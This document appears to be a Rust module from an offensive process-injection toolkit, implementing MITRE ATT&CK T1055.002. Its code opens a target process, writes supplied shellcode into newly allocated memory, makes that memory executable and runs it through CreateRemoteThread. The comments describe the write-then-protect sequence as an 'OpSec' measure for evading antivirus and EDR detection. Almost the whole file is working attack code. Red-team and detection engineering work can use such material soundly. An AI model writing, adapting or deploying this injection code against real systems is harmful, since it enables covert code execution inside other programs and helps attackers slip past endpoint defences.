//! Implementation of **MITRE ATT&CK T1055.002: Portable Executable Injection**.
//!
//! This module implements the "Remote Thread" execution strategy. While the MITRE technique
//! broadly refers to injecting PE files, this implementation acts as the low-level primitive
//! that allocates memory and executes raw code (Shellcode) in a target process.
//!
//! # OpSec Note
//! This implementation utilizes the **"Allocate -> Write -> Protect -> Execute"** pattern.
//! It avoids allocating `RWX` (Read-Write-Execute) memory directly, which is a major
//! heuristic used by Antivirus/EDR solutions to flag malicious behavior.

use std::{
    mem::transmute,
    os::windows::raw::HANDLE,
    ptr::{null, null_mut},
};

use windows_sys::Win32::{
    Foundation::{CloseHandle, FALSE, GetLastError, INVALID_HANDLE_VALUE},
    System::{
        Diagnostics::Debug::WriteProcessMemory,
        Memory::{
            MEM_COMMIT, MEM_RESERVE, PAGE_EXECUTE_READ, PAGE_READWRITE, VirtualAllocEx,
            VirtualProtectEx,
        },
        Threading::{
            CreateRemoteThread, LPTHREAD_START_ROUTINE, OpenProcess, PROCESS_CREATE_THREAD,
            PROCESS_QUERY_INFORMATION, PROCESS_VM_OPERATION, PROCESS_VM_READ, PROCESS_VM_WRITE,
        },
    },
};

use crate::{
    Error, Result, info,
    payload::Payload,
    strategy::{PortableExecutable, Strategy, Technique},
    target::Target,
};

/// The concrete strategy implementation for T1055.002.
#[derive(Default)]
pub struct T1055_002;

impl Strategy for T1055_002 {
    fn execute(&self, technique: &Technique, payload: &Payload, target: &Target) -> Result<()> {
        let info = technique.info();
        info!("Strategy: {} ({})", info.mitre_id, info.name);

        let method = match technique {
            Technique::T1055_002(m) => m,
            _ => return Err(Error::Execution("Internal dispatch error".into())),
        };

        let process_id = match target {
            Target::Pid(id) => *id,
            _ => {
                return Err(Error::Validation(format!(
                    "Strategy '{}' requires a Target PID.",
                    info.mitre_id
                )));
            }
        };

        let shellcode = match payload {
            Payload::Shellcode { bytes, .. } => bytes,
            _ => {
                return Err(Error::Mismatch {
                    strategy: info.mitre_id,
                    variant: payload.variant_name(),
                });
            }
        };

        match method {
            PortableExecutable::RemoteThread => {
                info!("Method: Remote Thread Injection");
                inject_remote_thread(process_id, shellcode)
            }
        }
    }
}

/// A RAII (Resource Acquisition Is Initialization) wrapper for Windows Handles.
///
/// Ensures that `CloseHandle` is automatically called when the scope ends,
/// preventing resource leaks in the operating system.
struct HandleGuard(HANDLE);

impl HandleGuard {
    fn new(handle: HANDLE) -> Self {
        Self(handle)
    }
}

impl Drop for HandleGuard {
    fn drop(&mut self) {
        if !self.0.is_null() && self.0 != INVALID_HANDLE_VALUE {
            unsafe { CloseHandle(self.0) };
        }
    }
}

/// Performs injection via the `CreateRemoteThread` API.
///
/// # Logic Flow
/// 1. **OpenProcess**: Acquire handle to target.
/// 2. **VirtualAllocEx**: Allocate memory as `PAGE_READWRITE` (RW).
/// 3. **WriteProcessMemory**: Copy the shellcode into the allocated buffer.
/// 4. **VirtualProtectEx**: Change memory protections to `PAGE_EXECUTE_READ` (RX).
/// 5. **CreateRemoteThread**: Execute the shellcode in a new thread.
fn inject_remote_thread(process_id: u32, shellcode: &[u8]) -> Result<()> {
    // 1. Open Target Process
    let process_handle = unsafe {
        OpenProcess(
            PROCESS_CREATE_THREAD
                | PROCESS_QUERY_INFORMATION
                | PROCESS_VM_OPERATION
                | PROCESS_VM_READ
                | PROCESS_VM_WRITE,
            FALSE,
            process_id,
        )
    };

    if process_handle.is_null() {
        return Err(Error::Win32("OpenProcess", unsafe { GetLastError() }));
    }

    let process_guard = HandleGuard::new(process_handle);

    // 2. Allocate Memory RW (Read-Write)
    // OpSec: We intentionally avoid PAGE_EXECUTE_READWRITE (RWX) to reduce detection surface.
    let remote_addr = unsafe {
        VirtualAllocEx(
            process_guard.0,
            null(),
            shellcode.len(),
            MEM_COMMIT | MEM_RESERVE,
            PAGE_READWRITE,
        )
    };

    if remote_addr.is_null() {
        return Err(Error::Win32("VirtualAllocEx", unsafe { GetLastError() }));
    }

    // 3. Write Shellcode to Target Memory
    let mut write_len: usize = 0;

    let success = unsafe {
        WriteProcessMemory(
            process_guard.0,
            remote_addr,
            shellcode.as_ptr().cast(),
            shellcode.len(),
            &mut write_len,
        )
    };

    if success == 0 || write_len != shellcode.len() {
        return Err(Error::Win32("WriteProcessMemory", unsafe {
            GetLastError()
        }));
    }

    // 4. Change Protection to RX (Execute-Read)
    // Now that writing is done, we make it executable.
    let mut old_protection: u32 = 0;

    let success = unsafe {
        VirtualProtectEx(
            process_guard.0,
            remote_addr,
            shellcode.len(),
            PAGE_EXECUTE_READ,
            &mut old_protection,
        )
    };

    if success == 0 {
        return Err(Error::Win32("VirtualProtectEx", unsafe { GetLastError() }));
    }

    // 5. Create Remote Thread
    // We cast the remote address to a function pointer type for the API call.
    let routine_ptr: LPTHREAD_START_ROUTINE = unsafe { transmute(remote_addr) };

    let thread_handle = unsafe {
        CreateRemoteThread(
            process_guard.0,
            null(),
            0,
            routine_ptr,
            null(),
            0,
            null_mut(),
        )
    };

    if thread_handle.is_null() {
        return Err(Error::Win32("CreateRemoteThread", unsafe {
            GetLastError()
        }));
    }

    let _thread_guard = HandleGuard::new(thread_handle);

    Ok(())
}
